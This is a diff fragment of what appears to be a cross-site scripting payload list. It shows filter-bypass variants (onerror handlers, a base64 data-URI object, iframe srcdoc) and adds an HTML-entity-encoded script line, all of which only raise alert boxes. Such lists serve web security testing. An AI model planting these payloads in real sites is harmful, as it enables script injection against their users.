@@ -25,3 +25,6 @@ javascript:alert('XSS')
 <img src="x" onerror="Function('alert(XSS)')()">
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></object>
 <iframe srcdoc='<script>alert("XSS")</script>'></iframe>
+
+
+&#60;script&#62;alert('Hello, World!')&#60;/script&#62;
